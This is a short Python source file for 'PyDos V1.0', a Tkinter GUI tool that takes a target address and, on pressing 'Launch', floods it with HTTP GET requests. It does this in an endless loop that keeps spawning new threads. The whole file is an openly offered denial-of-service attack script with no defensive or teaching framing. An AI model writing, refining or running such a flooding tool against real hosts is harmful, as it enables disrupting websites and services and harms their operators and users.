import threading
import requests
import time
from tkinter import *
from PIL import ImageTk,Image

Tk.Lable = Label
p = print
#the box itself
root = Tk()
root.title('PyDos')
root.geometry("300x350")

#pretty things
root.configure(bg='black')

L1 = Tk.Lable(root, text="PyDos V1.0", padx=10, pady=10, bg='black', fg='white')
L1.pack()



#the imput box
e = Entry(root, width=25, bg='black', fg='white')
e.pack()
e.insert(0, "Enter target address",)




#Starts attack function 
def atk():
    for _ in range(2):
        while True:
                r = requests.get
                r (e.get())
                x = threading.Thread(target=atk)
                x.start()
                p ('requests: ', threading.active_count())

#the buttons   
myButton = Button(root, text="Launch", command=atk, bg="red")
myButton.pack()


#request counter 

L2 = Tk.Lable(root, text='Requests sent')
L2.pack()


button_quit = Button(root, text="exit", command=root.quit, bg='black', fg='white' )
button_quit.pack()




root.mainloop()
